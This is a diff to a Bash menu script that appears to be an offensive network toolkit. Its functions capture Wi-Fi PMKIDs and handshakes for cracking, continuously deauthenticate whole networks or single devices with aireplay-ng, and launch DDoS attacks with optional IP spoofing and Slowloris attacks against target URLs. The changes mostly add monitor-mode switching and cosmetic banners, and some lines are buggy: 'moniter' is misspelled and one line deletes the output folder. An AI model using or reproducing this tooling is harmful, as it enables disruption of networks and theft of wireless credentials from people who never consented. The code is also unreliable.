@@ -9,6 +9,11 @@ source "lib/router-sploit.sh"
 source "lib/airgeddon.sh"
 
 capture-pmkid() {
+    clear
+    echo "Processing"
+    ifconfig "$INTERFACE" down
+    iwconfig "$INTERFACE" mode moniter
+    ifconfig "$INTERFACE" up
     network-scan-1
     echo ""
     read -p "File name to save as: " FILE1
@@ -18,24 +23,31 @@ capture-pmkid() {
     clear
     hcxdumptool -i "$INTERFACE" -o "$FILE1".pcapng --enable_status=1 -c "$CHANNEL1"
     hcxpcaptool -E essidlist -I identitylist -U usernamelist -z "$FILE1".16800 "$FILE1".pcapng
-    mv "$FILE1".pcapng PMKID
+    rm "$FILE1".pcapng PMKID
     mv "$FILE1".16800 PMKID
-    rm -R identitylist
-    rm -R essidlist
+    rm -R identitylist 2>/dev/null
+    rm -R essidlist 2>/dev/null
     sleep 1
     clear
-    echo "PMKID File Saved"
-    echo "File Converted"
+    echo "Processing"
     ifconfig "$INTERFACE" down
     iwconfig "$INTERFACE" mode managed
     ifconfig "$INTERFACE" up
-    sleep 2
-    main-choice-1
+    main-menu
 }
 capture-handshake() {
+    clear
+    echo "Processing"
+    ifconfig "$INTERFACE" down
+    iwconfig "$INTERFACE" mode moniter
+    ifconfig "$INTERFACE" up
     network-scan-2
     echo ""
-    read -p "File name to save as: " FILE2
+    read -p "File name to save as (default is WiFi name): " FILE2
+    if [ -z $FILE2 ]
+    then
+    FILE2=$CHOSEN_SCAN
+    fi
     echo ""
     echo "During Capture press "CTRL + C" to stop"
     read -n 1 -r -s -p "Press any button to begin capture..."
@@ -45,14 +57,12 @@ capture-handshake() {
     rm "$FILE2"-01.kismet.csv
     rm "$FILE2"-01.kismet.netxml
     rm "$FILE2"-01.log.csv
-    mv "$FILE2"-01.cap Handshake/
-    echo "Handshake File Saved"
-    echo "Files cleaned"
-    echo "File moved"
+    mv $FILE2-01.cap $FILE2.cap
+    mv $FILE2.cap Handshake
+    echo "Processing"
     ifconfig "$INTERFACE" down
     iwconfig "$INTERFACE" mode managed
     ifconfig "$INTERFACE" up
-    sleep 1
     main-menu
 }
 
@@ -74,10 +84,20 @@ crack-handshake() {
     main-choice-1
 }
 capture-packets() {
+    clear
+    echo "Processing"
+    ifconfig "$INTERFACE" down
+    iwconfig "$INTERFACE" mode moniter
+    ifconfig "$INTERFACE" up
     network-scan-3
     echo ""
-    read -p "File to save as: " FILE3
+    read -p "File to save as (default is WiFi name): " FILE3
+    if [ -z $FILE3 ]
+    then
+    FILE3=$CHOSEN_SCAN
+    fi
     clear
+    echo "Processing"
     airodump-ng --bssid $BSSID3 -c $CHANNEL3 -w $FILE3 $INTERFACE
     mv "$FILE3"-01.cap Captured-packets
     rm "$FILE3"-01.csv
@@ -93,7 +113,7 @@ geolocate() {
     geoip() {
         clear
         figlet Gerolocate IP
-        echo "------------------- Geolocate and IP Adress -------------------"
+        echo -e "\e[0;36m-----------------\e[0m \e[1;33mGeolocate and IP Adress\e[0m \e[0;36m-----------------\e[0m"
         echo ""
         echo -e "\e[1;31mWARNING:\e[0m If using a URL use "nslookup" to get IP"
         echo ""
@@ -126,7 +146,7 @@ port-scan() {
     scan-function() {
         clear
         figlet Port Scan
-        echo "------- Scan for Open Ports on a Network -------"
+        echo -e "\e[0;36m------------\e[0m \e[1;33mScan for Open Ports\e[0m \e[0;36m------------\e[0m"
         echo ""
         echo -e "\e[1;31mWARNING:\e[0m Remove "http" if using a URL"
         echo ""
@@ -138,10 +158,10 @@ port-scan() {
         sleep 2
         scan-function
         else
-        nmap "$IP" > temp.txt
+        nmap "$IP" > temp.txt 2>/dev/null
         echo ""
         OPENPORT=$(cat temp.txt | grep "open")
-        if [ -z $OPENPORT ]
+        if [ -z $OPENPORT ] 2>/dev/null
         then
         echo "No Open Ports Found!"
         else
@@ -159,8 +179,8 @@ port-scan() {
 local-scan() {
     loading-screen-1() {
     clear
-    figlet Local Scan
-    echo "-------- Scan all devices on a local network --------"
+    figlet Local Net Scan
+    echo -e "\e[0;36m------------------\e[0m \e[1;33mScan all devices on network\e[0m \e[0;36m------------------\e[0m"
     echo ""
     echo -e "\e[1;31mWARNING:\e[0m The network you are connected to will be scanned"
     echo ""
@@ -175,7 +195,6 @@ local-scan() {
     echo ""
     cat temp2.txt
     rm temp2.txt
-    echo ""
     read -n 1 -r -s -p "Press any key to continue..."
     }
 
@@ -195,7 +214,9 @@ ddos-ip() {
     clear 
     figlet DDOS IP Address
     echo ""
-    echo "================== Untraceable DDOS Attack =================="
+    echo -e "\e[0;36m------------------\e[0m \e[1;33mDistributive Denial of Service Attack\e[0m \e[0;36m------------------\e[0m"
+    echo ""
+    echo -e "\e[1;36mNOTE:\e[0m If specified, the attack can look like its coming from a certain IP"
     echo ""
     read -p "Enter Target IP Address: " IP
     if [ -z $IP ]
@@ -232,7 +253,7 @@ ddos-ip() {
 slowloris-attack() {
     clear
     figlet Slow Loris Attack
-    echo "------------------- Slow down a website with http requests -------------------"
+    echo -e "\e[0;36m--------------------\e[0m \e[1;33mSlow down a website with http requests\e[0m \e[0;36m--------------------\e[0m"
     echo ""
     read -p "Enter target URL: " URL
     echo ""
@@ -249,18 +270,37 @@ slowloris-attack() {
     
 }
 deauth-network() {
+    clear
+    echo "Processing"
+    ifconfig "$INTERFACE" down
+    iwconfig "$INTERFACE" mode moniter
+    ifconfig "$INTERFACE" up
     network-scan-4
     clear
     aireplay-ng -0 0 -a $BSSID4 $INTERFACE
+    clear
+    echo "Processing"
+    ifconfig "$INTERFACE" down
+    iwconfig "$INTERFACE" mode managed
+    ifconfig "$INTERFACE" up
     main-menu
-
 }
 deauth-device() {
+    clear
+    echo "Processing"
+    ifconfig "$INTERFACE" down
+    iwconfig "$INTERFACE" mode moniter
+    ifconfig "$INTERFACE" up
     network-scan-5
     device-scan
     choose-device
     clear
     aireplay-ng --deauth 0 -a $BSSID5 -c $CHOSEN_DEVICE $INTERFACE
+    clear
+    echo "Processing"
+    ifconfig "$INTERFACE" down
+    iwconfig "$INTERFACE" mode managed
+    ifconfig "$INTERFACE" up
     main-menu
 }
 router-sploit() {
